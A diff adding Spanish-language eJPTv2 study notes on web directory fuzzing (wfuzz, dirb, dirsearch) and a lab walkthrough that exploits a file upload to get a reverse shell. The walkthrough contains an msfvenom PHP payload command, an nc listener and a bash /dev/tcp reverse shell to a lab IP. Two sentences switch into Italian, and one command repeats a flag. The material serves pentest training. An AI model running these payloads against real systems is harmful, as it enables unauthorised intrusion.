@@ -408,8 +408,103 @@ Ahora, como hemos visto anteriormente, podría enumerar los subdominios con Wfuz
 `sudo wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.devhunter.nyx" -u 10.10.10.11`  
 
 **TIPS**  
-Para enumerar los subdominios, el diccionario más adecuado es:    
+Para enumerar los subdominios, el diccionario más adecuado es:  
+
 `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`
+
+# Otros instrumentos de fuzzing web – Uso de WFUZZ, DIRB y DIRSEARCH 
+
+**WFUZZ**  
+Puedo realizar la enumeración de páginas web con el siguiente comando:  
+
+`sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.12/FUZZ`  
+
+**DIRB** 
+Puedo realizar la enumeración de páginas web con el siguiente comando:  
+
+`sudo dirb http://10.10.10.12/`  
+
+El problema de `dirb` es que utiliza un diccionario muy limitado.   
+Puede ser útil para realizar un escaneo rápido, y si encuentro algo interesante, puedo escanearlo más a fondo con Wfuzz o Gobuster.  
+
+**DIRSEARCH**  
+Puedo realizar la enumeración de páginas web con el siguiente comando:   
+
+`sudo dirsearch -u http://10.10.10.12/`  
+
+Di forma automatica cerca già estensioni.  
+Se voglio passargli un dizionario un po' più completo posso dare il comando:  
+
+`sudo dirsearch -u http://10.10.10.12/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.12/`   
+
+# Exploitation della vulnerabilità file upload  
+Normalmente, un vector de ataque muy utilizado es la carga de archivos maliciosos para obtener una reverse shell.  
+Si me encuentro con una página web que tiene un inicio de sesión y la posibilidad de registrarme, siempre conviene hacerlo, ya que puedo analizar mejor la página y encontrar un vector de ataque.  
+En este ejemplo, utilizaremos la máquina Sectalks. Una vez que he creado un usuario, puedo ver que hay un menú que me permite cargar archivos.  
+
+![41](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/41.jpg)     
+
+Lo que puedo hacer es crear un archivo malicioso, por ejemplo en PHP, y tratar de cargarlo. Utilizaré `msfvenom` con el siguiente comando:  
+
+`sudo msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=6969 -f raw > file.php`  
+
+Una vez generado, lo cargaré en la página web.    
+Perfecto, ahora debo intentar entender dónde se guardan los archivos cargados, por lo que tendré que enumerar el sitio con Wfuzz o Gobuster, como se vio anteriormente.  
+
+`sudo gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`  
+
+De esta manera, puedo ver que existe una carpeta `uploads`, que es donde probablemente se guardarán los archivos cargados.  
+
+![42](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/42.jpg)      
+
+Y efectivamente es así; de hecho, si voy a la dirección `http://10.10.10.13/uploads/`, veo el archivo que cargué.  
+
+![43](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/43.jpg)     
+
+Ahora solo me queda abrir una terminal en la máquina Kali y ponerme en escucha en el puerto 6969 (el que se usó durante la generación del payload).   
+Luego, debo hacer clic en el archivo `.php` cargado en la página web.  
+
+`sudo nc -lvnp 6969`  
+
+Y voilà, hemos obtenido una reverse shell.  
+
+![44](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/44.jpg)  
+
+****TIPS***  
+Lamentablemente, la shell generada con `msfvenom` no siempre es muy estable.   
+Para trabajar con más calma y evitar problemas de desconexiones, es recomendable ponerse en escucha en otro puerto, por ejemplo el 7070.   
+Luego, puedes generar una reverse shell desde una página web como revshells.com.   
+
+![45](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/45.jpg)   
+
+Ahora abrimos otra ventana del terminal y nos ponemos en escucha en el puerto de la reverse shell recién creada (en este ejemplo, el 7070).  
+
+Luego, desde la shell que obtuvimos con `msfvenom`, digitamos el siguiente comando:  
+
+`bash -c "sh -i >& /dev/tcp/10.10.10.10/7070 0>&1"`  
+
+Sería `bash -c` y entre comillas, pegar el comando generado por la página web revshells.com.   
+Y voilà, de esta manera obtenemos una reverse shell estable.  
+
+![46](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/46.jpg)  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
